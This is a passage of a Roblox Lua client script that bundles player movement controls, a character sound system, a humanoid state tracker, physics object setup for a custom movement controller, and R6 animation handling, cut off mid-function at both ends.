		-- and then call GetMoveVector on it. When there is no active controller, this function returns
		-- nil so that this case can be distinguished from no current movement (which returns zero vector).
		function ControlModule:GetMoveVector()
			if self.activeController then
				return self.activeController:GetMoveVector()
			end
			return Vector3.new(0,0,0)
		end

		function ControlModule:GetActiveController()
			return self.activeController
		end

		function ControlModule:EnableActiveControlModule()
			if self.activeControlModule == ClickToMove then
				-- For ClickToMove, when it is the player's choice, we also enable the full keyboard controls.
				-- When the developer is forcing click to move, the most keyboard controls (WASD) are not available, only jump.
				self.activeController:Enable(
					true,
					Players.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.UserChoice,
					self.touchJumpController
				)
			elseif self.touchControlFrame then
				self.activeController:Enable(true, self.touchControlFrame)
			else
				self.activeController:Enable(true)
			end
		end

		function ControlModule:Enable(enable)
			if not self.activeController then
				return
			end

			if enable == nil then
				enable = true
			end
			if enable then
				self:EnableActiveControlModule()
			else
				self:Disable()
			end
		end

		-- For those who prefer distinct functions
		function ControlModule:Disable()
			if self.activeController then
				self.activeController:Enable(false)

				if self.moveFunction then
					self.moveFunction(Players.LocalPlayer, Vector3.new(0,0,0), true)
				end
			end
		end


		-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
		function ControlModule:SelectComputerMovementModule()
			if not (UserInputService.KeyboardEnabled or UserInputService.GamepadEnabled) then
				return nil, false
			end

			local computerModule
			local DevMovementMode = Players.LocalPlayer.DevComputerMovementMode

			if DevMovementMode == Enum.DevComputerMovementMode.UserChoice then
				computerModule = computerInputTypeToModuleMap[lastInputType]
				if UserGameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove and computerModule == Keyboard then
					-- User has ClickToMove set in Settings, prefer ClickToMove controller for keyboard and mouse lastInputTypes
					computerModule = ClickToMove
				end
			else
				-- Developer has selected a mode that must be used.
				computerModule = movementEnumToModuleMap[DevMovementMode]

				-- computerModule is expected to be nil here only when developer has selected Scriptable
				if (not computerModule) and DevMovementMode ~= Enum.DevComputerMovementMode.Scriptable then
					warn("No character control module is associated with DevComputerMovementMode ", DevMovementMode)
				end
			end

			if computerModule then
				return computerModule, true
			elseif DevMovementMode == Enum.DevComputerMovementMode.Scriptable then
				-- Special case where nil is returned and we actually want to set self.activeController to nil for Scriptable
				return nil, true
			else
				-- This case is for when computerModule is nil because of an error and no suitable control module could
				-- be found.
				return nil, false
			end
		end

		-- Choose current Touch control module based on settings (user, dev)
		-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
		function ControlModule:SelectTouchModule()
			if not UserInputService.TouchEnabled then
				return nil, false
			end
			local touchModule
			local DevMovementMode = Players.LocalPlayer.DevTouchMovementMode
			if DevMovementMode == Enum.DevTouchMovementMode.UserChoice then
				touchModule = movementEnumToModuleMap[UserGameSettings.TouchMovementMode]
			elseif DevMovementMode == Enum.DevTouchMovementMode.Scriptable then
				return nil, true
			else
				touchModule = movementEnumToModuleMap[DevMovementMode]
			end
			return touchModule, true
		end

		local function calculateRawMoveVector(humanoid, cameraRelativeMoveVector)
			local camera = Workspace.CurrentCamera
			if not camera then
				return cameraRelativeMoveVector
			end

			if humanoid:GetState() == Enum.HumanoidStateType.Swimming then
				return camera.CFrame:VectorToWorldSpace(cameraRelativeMoveVector)
			end

			local c, s
			local _, _, _, R00, R01, R02, _, _, R12, _, _, R22 = camera.CFrame:GetComponents()
			if R12 < 1 and R12 > -1 then
				-- X and Z components from back vector.
				c = R22
				s = R02
			else
				-- In this case the camera is looking straight up or straight down.
				-- Use X components from right and up vectors.
				c = R00
				s = -R01*math.sign(R12)
			end
			local norm = math.sqrt(c*c + s*s)
			return Vector3.new(
				(c*cameraRelativeMoveVector.x + s*cameraRelativeMoveVector.z)/norm,
				0,
				(c*cameraRelativeMoveVector.z - s*cameraRelativeMoveVector.x)/norm
			)
		end

		function ControlModule:OnRenderStepped(dt)
			if self.activeController and self.activeController.enabled and self.humanoid then
				-- Give the controller a chance to adjust its state
				self.activeController:OnRenderStepped(dt)

				-- Now retrieve info from the controller
				local moveVector = self.activeController:GetMoveVector()
				local cameraRelative = self.activeController:IsMoveVectorCameraRelative()

				local clickToMoveController = self:GetClickToMoveController()
				if self.activeController ~= clickToMoveController then
					if moveVector.magnitude > 0 then
						-- Clean up any developer started MoveTo path
						clickToMoveController:CleanupPath()
					else
						-- Get move vector for developer started MoveTo
						clickToMoveController:OnRenderStepped(dt)
						moveVector = clickToMoveController:GetMoveVector()
						cameraRelative = clickToMoveController:IsMoveVectorCameraRelative()
					end
				end

				-- Are we driving a vehicle ?
				local vehicleConsumedInput = false
				if self.vehicleController then
					moveVector, vehicleConsumedInput = self.vehicleController:Update(moveVector, cameraRelative, self.activeControlModule==Gamepad)
				end

				-- If not, move the player
				-- Verification of vehicleConsumedInput is commented out to preserve legacy behavior,
				-- in case some game relies on Humanoid.MoveDirection still being set while in a VehicleSeat
				--if not vehicleConsumedInput then
				if cameraRelative then
					moveVector = calculateRawMoveVector(self.humanoid, moveVector)
				end
				self.moveFunction(Players.LocalPlayer, moveVector, false)
				--end

				-- And make them jump if needed
				self.humanoid.Jump = self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping())
			end
		end

		function ControlModule:OnHumanoidSeated(active, currentSeatPart)
			if active then
				if currentSeatPart and currentSeatPart:IsA("VehicleSeat") then
					if not self.vehicleController then
						self.vehicleController = self.vehicleController.new(CONTROL_ACTION_PRIORITY)
					end
					self.vehicleController:Enable(true, currentSeatPart)
				end
			else
				if self.vehicleController then
					self.vehicleController:Enable(false, currentSeatPart)
				end
			end
		end

		function ControlModule:OnCharacterAdded(char)
			self.humanoid = char:FindFirstChildOfClass("Humanoid")
			while not self.humanoid do
				char.ChildAdded:wait()
				self.humanoid = char:FindFirstChildOfClass("Humanoid")
			end

			if self.touchGui then
				self.touchGui.Enabled = true
			end

			if self.humanoidSeatedConn then
				self.humanoidSeatedConn:Disconnect()
				self.humanoidSeatedConn = nil
			end
			self.humanoidSeatedConn = self.humanoid.Seated:Connect(function(active, currentSeatPart)
				self:OnHumanoidSeated(active, currentSeatPart)
			end)
		end

		function ControlModule:OnCharacterRemoving(char)
			self.humanoid = nil

			if self.touchGui then
				self.touchGui.Enabled = false
			end
		end

		-- Helper function to lazily instantiate a controller if it does not yet exist,
		-- disable the active controller if it is different from the on being switched to,
		-- and then enable the requested controller. The argument to this function must be
		-- a reference to one of the control modules, i.e. Keyboard, Gamepad, etc.
		function ControlModule:SwitchToController(controlModule)
			if not controlModule then
				if self.activeController then
					self.activeController:Enable(false)
				end
				self.activeController = nil
				self.activeControlModule = nil
			else
				if not self.controllers[controlModule] then
					self.controllers[controlModule] = controlModule.new(CONTROL_ACTION_PRIORITY)
				end

				if self.activeController ~= self.controllers[controlModule] then
					if self.activeController then
						self.activeController:Enable(false)
					end
					self.activeController = self.controllers[controlModule]
					self.activeControlModule = controlModule -- Only used to check if controller switch is necessary

					if self.touchControlFrame and (self.activeControlModule == ClickToMove
						or self.activeControlModule == TouchThumbstick
						or self.activeControlModule == DynamicThumbstick) then
						if not self.controllers[TouchJump] then
							self.controllers[TouchJump] = TouchJump.new()
						end
						self.touchJumpController = self.controllers[TouchJump]
						self.touchJumpController:Enable(true, self.touchControlFrame)
					else
						if self.touchJumpController then
							self.touchJumpController:Enable(false)
						end
					end

					self:EnableActiveControlModule()
				end
			end
		end

		function ControlModule:OnLastInputTypeChanged(newLastInputType)
			if lastInputType == newLastInputType then
				warn("LastInputType Change listener called with current type.")
			end
			lastInputType = newLastInputType

			if lastInputType == Enum.UserInputType.Touch then
				-- TODO: Check if touch module already active
				local touchModule, success = self:SelectTouchModule()
				if success then
					while not self.touchControlFrame do
						wait()
					end
					self:SwitchToController(touchModule)
				end
			elseif computerInputTypeToModuleMap[lastInputType] ~= nil then
				local computerModule = self:SelectComputerMovementModule()
				if computerModule then
					self:SwitchToController(computerModule)
				end
			end
		end

		-- Called when any relevant values of GameSettings or LocalPlayer change, forcing re-evalulation of
		-- current control scheme
		function ControlModule:OnComputerMovementModeChange()
			local controlModule, success =  self:SelectComputerMovementModule()
			if success then
				self:SwitchToController(controlModule)
			end
		end

		function ControlModule:OnTouchMovementModeChange()
			local touchModule, success = self:SelectTouchModule()
			if success then
				while not self.touchControlFrame do
					wait()
				end
				self:SwitchToController(touchModule)
			end
		end

		function ControlModule:CreateTouchGuiContainer()
			if self.touchGui then self.touchGui:Destroy() end

			-- Container for all touch device guis
			self.touchGui = Instance.new("ScreenGui")
			self.touchGui.Name = "TouchGui"
			self.touchGui.ResetOnSpawn = false
			self.touchGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			self.touchGui.Enabled = self.humanoid ~= nil

			self.touchControlFrame = Instance.new("Frame")
			self.touchControlFrame.Name = "TouchControlFrame"
			self.touchControlFrame.Size = UDim2.new(1, 0, 1, 0)
			self.touchControlFrame.BackgroundTransparency = 1
			self.touchControlFrame.Parent = self.touchGui

			self.touchGui.Parent = self.playerGui
		end

		function ControlModule:GetClickToMoveController()
			if not self.controllers[ClickToMove] then
				self.controllers[ClickToMove] = ClickToMove.new(CONTROL_ACTION_PRIORITY)
			end
			return self.controllers[ClickToMove]
		end

		function ControlModule:IsJumping()
			if self.activeController then
				return self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping())
			end
			return false
		end

		return ControlModule.new()
	end

	function _PlayerModule()
		local PlayerModule = {}
		PlayerModule.__index = PlayerModule
		function PlayerModule.new()
			local self = setmetatable({},PlayerModule)
			self.cameras = _CameraModule()
			self.controls = _ControlModule()
			return self
		end
		function PlayerModule:GetCameras()
			return self.cameras
		end
		function PlayerModule:GetControls()
			return self.controls
		end
		function PlayerModule:GetClickToMoveController()
			return self.controls:GetClickToMoveController()
		end
		return PlayerModule.new()
	end

	function _sounds()

		local SetState = Instance.new("BindableEvent",script)

		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")

		local SOUND_DATA = {
			Climbing = {
				SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
				Looped = true,
			},
			Died = {
				SoundId = "rbxasset://sounds/uuhhh.mp3",
			},
			FreeFalling = {
				SoundId = "rbxasset://sounds/action_falling.mp3",
				Looped = true,
			},
			GettingUp = {
				SoundId = "rbxasset://sounds/action_get_up.mp3",
			},
			Jumping = {
				SoundId = "rbxasset://sounds/action_jump.mp3",
			},
			Landing = {
				SoundId = "rbxasset://sounds/action_jump_land.mp3",
			},
			Running = {
				SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
				Looped = true,
				Pitch = 1.85,
			},
			Splash = {
				SoundId = "rbxasset://sounds/impact_water.mp3",
			},
			Swimming = {
				SoundId = "rbxasset://sounds/action_swim.mp3",
				Looped = true,
				Pitch = 1.6,
			},
		}

		-- wait for the first of the passed signals to fire
		local function waitForFirst(...)
			local shunt = Instance.new("BindableEvent")
			local slots = {...}

			local function fire(...)
				for i = 1, #slots do
					slots[i]:Disconnect()
				end

				return shunt:Fire(...)
			end

			for i = 1, #slots do
				slots[i] = slots[i]:Connect(fire)
			end

			return shunt.Event:Wait()
		end

		-- map a value from one range to another
		local function map(x, inMin, inMax, outMin, outMax)
			return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
		end

		local function playSound(sound)
			sound.TimePosition = 0
			sound.Playing = true
		end

		local function stopSound(sound)
			sound.Playing = false
			sound.TimePosition = 0
		end

		local function shallowCopy(t)
			local out = {}
			for k, v in pairs(t) do
				out[k] = v
			end
			return out
		end

		local function initializeSoundSystem(player, humanoid, rootPart)
			local sounds = {}

			-- initialize sounds
			for name, props in pairs(SOUND_DATA) do
				local sound = Instance.new("Sound")
				sound.Name = name

				-- set default values
				sound.Archivable = false
				sound.EmitterSize = 5
				sound.MaxDistance = 150
				sound.Volume = 0.65

				for propName, propValue in pairs(props) do
					sound[propName] = propValue
				end

				sound.Parent = rootPart
				sounds[name] = sound
			end

			local playingLoopedSounds = {}

			local function stopPlayingLoopedSounds(except)
				for sound in pairs(shallowCopy(playingLoopedSounds)) do
					if sound ~= except then
						sound.Playing = false
						playingLoopedSounds[sound] = nil
					end
				end
			end

			-- state transition callbacks
			local stateTransitions = {
				[Enum.HumanoidStateType.FallingDown] = function()
					stopPlayingLoopedSounds()
				end,

				[Enum.HumanoidStateType.GettingUp] = function()
					stopPlayingLoopedSounds()
					playSound(sounds.GettingUp)
				end,

				[Enum.HumanoidStateType.Jumping] = function()
					stopPlayingLoopedSounds()
					playSound(sounds.Jumping)
				end,

				[Enum.HumanoidStateType.Swimming] = function()
					local verticalSpeed = math.abs(rootPart.Velocity.Y)
					if verticalSpeed > 0.1 then
						sounds.Splash.Volume = math.clamp(map(verticalSpeed, 100, 350, 0.28, 1), 0, 1)
						playSound(sounds.Splash)
					end
					stopPlayingLoopedSounds(sounds.Swimming)
					sounds.Swimming.Playing = true
					playingLoopedSounds[sounds.Swimming] = true
				end,

				[Enum.HumanoidStateType.Freefall] = function()
					sounds.FreeFalling.Volume = 0
					stopPlayingLoopedSounds(sounds.FreeFalling)
					playingLoopedSounds[sounds.FreeFalling] = true
				end,

				[Enum.HumanoidStateType.Landed] = function()
					stopPlayingLoopedSounds()
					local verticalSpeed = math.abs(rootPart.Velocity.Y)
					if verticalSpeed > 75 then
						sounds.Landing.Volume = math.clamp(map(verticalSpeed, 50, 100, 0, 1), 0, 1)
						playSound(sounds.Landing)
					end
				end,

				[Enum.HumanoidStateType.Running] = function()
					stopPlayingLoopedSounds(sounds.Running)
					sounds.Running.Playing = true
					playingLoopedSounds[sounds.Running] = true
				end,

				[Enum.HumanoidStateType.Climbing] = function()
					local sound = sounds.Climbing
					if math.abs(rootPart.Velocity.Y) > 0.1 then
						sound.Playing = true
						stopPlayingLoopedSounds(sound)
					else
						stopPlayingLoopedSounds()
					end
					playingLoopedSounds[sound] = true
				end,

				[Enum.HumanoidStateType.Seated] = function()
					stopPlayingLoopedSounds()
				end,

				[Enum.HumanoidStateType.Dead] = function()
					stopPlayingLoopedSounds()
					playSound(sounds.Died)
				end,
			}

			-- updaters for looped sounds
			local loopedSoundUpdaters = {
				[sounds.Climbing] = function(dt, sound, vel)
					sound.Playing = vel.Magnitude > 0.1
				end,

				[sounds.FreeFalling] = function(dt, sound, vel)
					if vel.Magnitude > 75 then
						sound.Volume = math.clamp(sound.Volume + 0.9*dt, 0, 1)
					else
						sound.Volume = 0
					end
				end,

				[sounds.Running] = function(dt, sound, vel)
					sound.Playing = vel.Magnitude > 0.5 and humanoid.MoveDirection.Magnitude > 0.5
				end,
			}

			-- state substitutions to avoid duplicating entries in the state table
			local stateRemap = {
				[Enum.HumanoidStateType.RunningNoPhysics] = Enum.HumanoidStateType.Running,
			}

			local activeState = stateRemap[humanoid:GetState()] or humanoid:GetState()
			local activeConnections = {}

			local stateChangedConn = humanoid.StateChanged:Connect(function(_, state)
				state = stateRemap[state] or state

				if state ~= activeState then
					local transitionFunc = stateTransitions[state]

					if transitionFunc then
						transitionFunc()
					end

					activeState = state
				end
			end)

			local customStateChangedConn = SetState.Event:Connect(function(state)
				state = stateRemap[state] or state

				if state ~= activeState then
					local transitionFunc = stateTransitions[state]

					if transitionFunc then
						transitionFunc()
					end

					activeState = state
				end
			end)

			local steppedConn = RunService.Stepped:Connect(function(_, worldDt)
				-- update looped sounds on stepped
				for sound in pairs(playingLoopedSounds) do
					local updater = loopedSoundUpdaters[sound]

					if updater then
						updater(worldDt, sound, rootPart.Velocity)
					end
				end
			end)

			local humanoidAncestryChangedConn
			local rootPartAncestryChangedConn
			local characterAddedConn

			local function terminate()
				stateChangedConn:Disconnect()
				customStateChangedConn:Disconnect()
				steppedConn:Disconnect()
				humanoidAncestryChangedConn:Disconnect()
				rootPartAncestryChangedConn:Disconnect()
				characterAddedConn:Disconnect()
			end

			humanoidAncestryChangedConn = humanoid.AncestryChanged:Connect(function(_, parent)
				if not parent then
					terminate()
				end
			end)

			rootPartAncestryChangedConn = rootPart.AncestryChanged:Connect(function(_, parent)
				if not parent then
					terminate()
				end
			end)

			characterAddedConn = player.CharacterAdded:Connect(terminate)
		end

		local function playerAdded(player)
			local function characterAdded(character)
				-- Avoiding memory leaks in the face of Character/Humanoid/RootPart lifetime has a few complications:
				-- * character deparenting is a Remove instead of a Destroy, so signals are not cleaned up automatically.
				-- ** must use a waitForFirst on everything and listen for hierarchy changes.
				-- * the character might not be in the dm by the time CharacterAdded fires
				-- ** constantly check consistency with player.Character and abort if CharacterAdded is fired again
				-- * Humanoid may not exist immediately, and by the time it's inserted the character might be deparented.
				-- * RootPart probably won't exist immediately.
				-- ** by the time RootPart is inserted and Humanoid.RootPart is set, the character or the humanoid might be deparented.

				if not character.Parent then
					waitForFirst(character.AncestryChanged, player.CharacterAdded)
				end

				if player.Character ~= character or not character.Parent then
					return
				end

				local humanoid = character:FindFirstChildOfClass("Humanoid")
				while character:IsDescendantOf(game) and not humanoid do
					waitForFirst(character.ChildAdded, character.AncestryChanged, player.CharacterAdded)
					humanoid = character:FindFirstChildOfClass("Humanoid")
				end

				if player.Character ~= character or not character:IsDescendantOf(game) then
					return
				end

				-- must rely on HumanoidRootPart naming because Humanoid.RootPart does not fire changed signals
				local rootPart = character:FindFirstChild("HumanoidRootPart")
				while character:IsDescendantOf(game) and not rootPart do
					waitForFirst(character.ChildAdded, character.AncestryChanged, humanoid.AncestryChanged, player.CharacterAdded)
					rootPart = character:FindFirstChild("HumanoidRootPart")
				end

				if rootPart and humanoid:IsDescendantOf(game) and character:IsDescendantOf(game) and player.Character == character then
					initializeSoundSystem(player, humanoid, rootPart)
				end
			end

			if player.Character then
				characterAdded(player.Character)
			end
			player.CharacterAdded:Connect(characterAdded)
		end

		Players.PlayerAdded:Connect(playerAdded)
		for _, player in ipairs(Players:GetPlayers()) do
			playerAdded(player)
		end
		return SetState
	end

	function _StateTracker()
		local EPSILON = 0.1

		local SPEED = {
			["onRunning"] = true,
			["onClimbing"] = true 
		}

		local INAIR = {
			["onFreeFall"] = true,
			["onJumping"] = true
		}

		local STATEMAP = {
			["onRunning"] = Enum.HumanoidStateType.Running,
			["onJumping"] = Enum.HumanoidStateType.Jumping,
			["onFreeFall"] = Enum.HumanoidStateType.Freefall
		}

		local StateTracker = {}
		StateTracker.__index = StateTracker

		function StateTracker.new(humanoid, soundState)
			local self = setmetatable({}, StateTracker)

			self.Humanoid = humanoid
			self.HRP = humanoid.RootPart

			self.Speed = 0
			self.State = "onRunning"
			self.Jumped = false
			self.JumpTick = tick()

			self.SoundState = soundState

			self._ChangedEvent = Instance.new("BindableEvent")
			self.Changed = self._ChangedEvent.Event

			return self
		end

		function StateTracker:Destroy()
			self._ChangedEvent:Destroy()
		end

		function StateTracker:RequestedJump()
			self.Jumped = true
			self.JumpTick = tick()
		end

		function StateTracker:OnStep(gravityUp, grounded, isMoving)
			local cVelocity = self.HRP.Velocity
			local gVelocity = cVelocity:Dot(gravityUp)

			local oldState, oldSpeed = self.State, self.Speed

			local newState
			local newSpeed = cVelocity.Magnitude

			if (not grounded) then
				if (gVelocity > 0) then
					if (self.Jumped) then
						newState = "onJumping"
					else
						newState = "onFreeFall"
					end
				else
					if (self.Jumped) then
						self.Jumped = false
					end
					newState = "onFreeFall"
				end
			else
				if (self.Jumped and tick() - self.JumpTick > 0.1) then
					self.Jumped = false
				end
				newSpeed = (cVelocity - gVelocity*gravityUp).Magnitude
				newState = "onRunning"
			end

			newSpeed = isMoving and newSpeed or 0

			if (oldState ~= newState or (SPEED[newState] and math.abs(oldSpeed - newSpeed) > EPSILON)) then
				self.State = newState
				self.Speed = newSpeed
				self.SoundState:Fire(STATEMAP[newState])
				self._ChangedEvent:Fire(self.State, self.Speed)
			end
		end

		return StateTracker
	end
	function _InitObjects()
		local model = workspace:FindFirstChild("objects") or game:GetObjects("rbxassetid://5045408489")[1]
		local SPHERE = model:WaitForChild("Sphere")
		local FLOOR = model:WaitForChild("Floor")
		local VFORCE = model:WaitForChild("VectorForce")
		local BGYRO = model:WaitForChild("BodyGyro")
		local function initObjects(self)
			local hrp = self.HRP
			local humanoid = self.Humanoid
			local sphere = SPHERE:Clone()
			sphere.Parent = self.Character
			local floor = FLOOR:Clone()
			floor.Parent = self.Character
			local isR15 = (humanoid.RigType == Enum.HumanoidRigType.R15)
			local height = isR15 and (humanoid.HipHeight + 0.05) or 2
			local weld = Instance.new("Weld")
			weld.C0 = CFrame.new(0, -height, 0.1)
			weld.Part0 = hrp
			weld.Part1 = sphere
			weld.Parent = sphere
			local weld2 = Instance.new("Weld")
			weld2.C0 = CFrame.new(0, -(height + 1.5), 0)
			weld2.Part0 = hrp
			weld2.Part1 = floor
			weld2.Parent = floor
			local gyro = BGYRO:Clone()
			gyro.CFrame = hrp.CFrame
			gyro.Parent = hrp
			local vForce = VFORCE:Clone()
			vForce.Attachment0 = isR15 and hrp:WaitForChild("RootRigAttachment") or hrp:WaitForChild("RootAttachment")
			vForce.Parent = hrp
			return sphere, gyro, vForce, floor
		end
		return initObjects
	end
	local plr = game.Players.LocalPlayer
	local ms = plr:GetMouse()
	local char
	plr.CharacterAdded:Connect(function(c)
		char = c
	end)
	function _R6()
		function r6()
			local Figure = char
			local Torso = Figure:WaitForChild("Torso")
			local RightShoulder = Torso:WaitForChild("Right Shoulder")
			local LeftShoulder = Torso:WaitForChild("Left Shoulder")
			local RightHip = Torso:WaitForChild("Right Hip")
			local LeftHip = Torso:WaitForChild("Left Hip")
			local Neck = Torso:WaitForChild("Neck")
			local Humanoid = Figure:WaitForChild("Humanoid")
			local pose = "Standing"
			local currentAnim = ""
			local currentAnimInstance = nil
			local currentAnimTrack = nil
			local currentAnimKeyframeHandler = nil
			local currentAnimSpeed = 1.0
			local animTable = {}
			local animNames = { 
				idle = 	{	
					{ id = "http://www.roblox.com/asset/?id=180435571", weight = 9 },
					{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
				},
				walk = 	{ 	
					{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
				}, 
				run = 	{
					{ id = "run.xml", weight = 10 } 
				}, 
				jump = 	{
					{ id = "http://www.roblox.com/asset/?id=125750702", weight = 10 } 
				}, 
				fall = 	{
					{ id = "http://www.roblox.com/asset/?id=180436148", weight = 10 } 
				}, 
				climb = {
					{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
				}, 
				sit = 	{
					{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
				},	
				toolnone = {
					{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
				},
				toolslash = {
					{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
					--				{ id = "slash.xml", weight = 10 } 
				},
				toollunge = {
					{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
				},
				wave = {
					{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
				},
				point = {
					{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
				},
				dance1 = {
					{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
				},
				dance2 = {
					{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
				},
				dance3 = {
					{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
				},
				laugh = {
					{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
				},
				cheer = {
					{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
				},
			}
			local dances = {"dance1", "dance2", "dance3"}
			-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
			local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}
			function configureAnimationSet(name, fileList)
				if (animTable[name] ~= nil) then
					for _, connection in pairs(animTable[name].connections) do
						connection:disconnect()
					end
				end
				animTable[name] = {}
				animTable[name].count = 0
				animTable[name].totalWeight = 0	
				animTable[name].connections = {}
				-- check for config values
				local config = script:FindFirstChild(name)
				if (config ~= nil) then
					--		print("Loading anims " .. name)
					table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
					table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
					local idx = 1
					for _, childPart in pairs(config:GetChildren()) do
						if (childPart:IsA("Animation")) then
							table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
							animTable[name][idx] = {}
							animTable[name][idx].anim = childPart
							local weightObject = childPart:FindFirstChild("Weight")
							if (weightObject == nil) then
								animTable[name][idx].weight = 1
							else
								animTable[name][idx].weight = weightObject.Value
							end
							animTable[name].count = animTable[name].count + 1
							animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
							--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
							idx = idx + 1
						end
					end
				end
				-- fallback to defaults
				if (animTable[name].count <= 0) then
					for idx, anim in pairs(fileList) do
						animTable[name][idx] = {}
						animTable[name][idx].anim = Instance.new("Animation")
						animTable[name][idx].anim.Name = name
						animTable[name][idx].anim.AnimationId = anim.id
						animTable[name][idx].weight = anim.weight
						animTable[name].count = animTable[name].count + 1
						animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
						--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
					end
				end
			end
			-- Setup animation objects
			function scriptChildModified(child)
				local fileList = animNames[child.Name]
				if (fileList ~= nil) then
					configureAnimationSet(child.Name, fileList)
				end	
			end

			script.ChildAdded:connect(scriptChildModified)
			script.ChildRemoved:connect(scriptChildModified)


			for name, fileList in pairs(animNames) do 
				configureAnimationSet(name, fileList)
			end	

			-- ANIMATION

			-- declarations
			local toolAnim = "None"
			local toolAnimTime = 0

			local jumpAnimTime = 0
			local jumpAnimDuration = 0.3

			local toolTransitionTime = 0.1
			local fallTransitionTime = 0.3
			local jumpMaxLimbVelocity = 0.75

			-- functions

			function stopAllAnimations()
				local oldAnim = currentAnim

				-- return to idle if finishing an emote
				if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
					oldAnim = "idle"
				end

				currentAnim = ""
				currentAnimInstance = nil
				if (currentAnimKeyframeHandler ~= nil) then
					currentAnimKeyframeHandler:disconnect()
				end

				if (currentAnimTrack ~= nil) then
					currentAnimTrack:Stop()
					currentAnimTrack:Destroy()
					currentAnimTrack = nil
				end
				return oldAnim
			end

			function setAnimationSpeed(speed)
				if speed ~= currentAnimSpeed then
					currentAnimSpeed = speed
					currentAnimTrack:AdjustSpeed(currentAnimSpeed)
				end
			end

			function keyFrameReachedFunc(frameName)
				if (frameName == "End") then

					local repeatAnim = currentAnim
					-- return to idle if finishing an emote
					if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
						repeatAnim = "idle"
					end

					local animSpeed = currentAnimSpeed
					playAnimation(repeatAnim, 0.0, Humanoid)
					setAnimationSpeed(animSpeed)
				end
			end

			-- Preload animations
			function playAnimation(animName, transitionTime, humanoid) 

				local roll = math.random(1, animTable[animName].totalWeight) 
				local origRoll = roll
				local idx = 1
				while (roll > animTable[animName][idx].weight) do
					roll = roll - animTable[animName][idx].weight
					idx = idx + 1
				end
				--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
				local anim = animTable[animName][idx].anim

				-- switch animation		
				if (anim ~= currentAnimInstance) then

					if (currentAnimTrack ~= nil) then
						currentAnimTrack:Stop(transitionTime)
						currentAnimTrack:Destroy()
					end

					currentAnimSpeed = 1.0

					-- load it to the humanoid; get AnimationTrack
					currentAnimTrack = humanoid:LoadAnimation(anim)
					currentAnimTrack.Priority = Enum.AnimationPriority.Core

					-- play the animation
					currentAnimTrack:Play(transitionTime)
					currentAnim = animName
					currentAnimInstance = anim

					-- set up keyframe name triggers
					if (currentAnimKeyframeHandler ~= nil) then
						currentAnimKeyframeHandler:disconnect()
					end
					currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)

				end

			end

			-------------------------------------------------------------------------------------------
			-------------------------------------------------------------------------------------------

			local toolAnimName = ""
			local toolAnimTrack = nil
			local toolAnimInstance = nil
			local currentToolAnimKeyframeHandler = nil

			function toolKeyFrameReachedFunc(frameName)
				if (frameName == "End") then
					--		print("Keyframe : ".. frameName)	
					playToolAnimation(toolAnimName, 0.0, Humanoid)
				end
			end


			function playToolAnimation(animName, transitionTime, humanoid, priority)	 

				local roll = math.random(1, animTable[animName].totalWeight) 
				local origRoll = roll
				local idx = 1
				while (roll > animTable[animName][idx].weight) do
					roll = roll - animTable[animName][idx].weight
					idx = idx + 1
				end
				--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
				local anim = animTable[animName][idx].anim

				if (toolAnimInstance ~= anim) then

					if (toolAnimTrack ~= nil) then
						toolAnimTrack:Stop()
						toolAnimTrack:Destroy()
						transitionTime = 0
					end

					-- load it to the humanoid; get AnimationTrack
					toolAnimTrack = humanoid:LoadAnimation(anim)
					if priority then
						toolAnimTrack.Priority = priority
					end

					-- play the animation
					toolAnimTrack:Play(transitionTime)
					toolAnimName = animName
					toolAnimInstance = anim

					currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
				end
			end

			function stopToolAnimations()
